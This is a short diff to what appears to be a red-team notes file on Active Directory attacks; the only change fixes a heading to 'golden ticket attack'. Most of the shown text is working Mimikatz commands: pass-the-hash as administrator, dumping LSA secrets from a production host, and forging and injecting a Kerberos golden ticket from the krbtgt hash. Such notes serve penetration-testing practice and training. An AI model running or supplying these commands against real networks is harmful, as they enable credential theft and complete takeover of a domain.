@@ -12,7 +12,7 @@ Invoke-Mimikatz -command '"sekurlsa::pth /user:administrator /domain:research.se
 Invoke-Mimikatz -command '"lsadump::lsa /patch"' -computername prod.research.security.local
 ```
 
-- Perform Final golden attack
+- Perform Final golden ticket attack
 ```
 Invoke-Mimikatz -command '"kerberos::golden /user:administrator /domain:research.security.local /sid:domain_sid /krbtgt:above_enumerated_krbtgt /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
